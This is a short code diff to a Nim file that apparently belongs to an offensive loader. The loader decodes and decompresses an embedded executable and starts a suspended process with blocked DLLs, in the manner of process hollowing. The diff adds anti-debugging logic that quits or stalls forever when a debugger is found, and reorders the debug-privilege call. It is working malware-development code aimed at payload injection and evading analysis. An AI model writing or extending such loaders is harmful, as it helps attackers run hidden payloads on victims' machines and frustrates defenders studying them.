@@ -1,6 +1,7 @@
 # Internal
 import utils
 import params
+import antidebug
 # External
 import os
 import winim
@@ -20,10 +21,6 @@ when defined(hollow4):
 
 
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
-    
-    # Enable debug privilege
-    discard setDebugPrivilege()
-
     # Decode and decompress PE
     var compressedPe = decode(compressedBase64PE)
     var peStr = uncompress(compressedPe)
@@ -43,7 +40,16 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
 
     # Sleep at execution
     sleepUselessCalculations(sleepSeconds)
-    
+
+    if antiDebugAction in["die", "troll"] and isDebugged():
+        if antiDebugAction == "die":
+            quit(1)
+        elif antiDebugAction == "troll":
+            sleepUselessCalculations(999999999)
+
+    # Enable debug privilege
+    discard setDebugPrivilege()
+
     # Create suspended process with extended attributes (block dll's)
     var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)
 
